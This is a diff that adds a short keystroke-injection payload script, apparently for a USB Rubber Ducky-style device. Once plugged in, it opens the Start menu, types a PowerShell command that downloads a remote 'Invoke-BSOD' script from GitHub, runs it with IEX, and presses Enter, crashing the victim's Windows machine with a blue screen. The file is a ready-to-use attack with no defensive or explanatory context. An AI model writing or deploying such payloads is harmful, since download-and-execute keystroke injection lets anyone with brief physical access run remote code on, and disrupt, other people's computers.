@@ -1,0 +1,6 @@
+DELAY 2000
+CTRL ESC
+DELAY 500
+STRING powershell IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
+DELAY 500
+ENTER
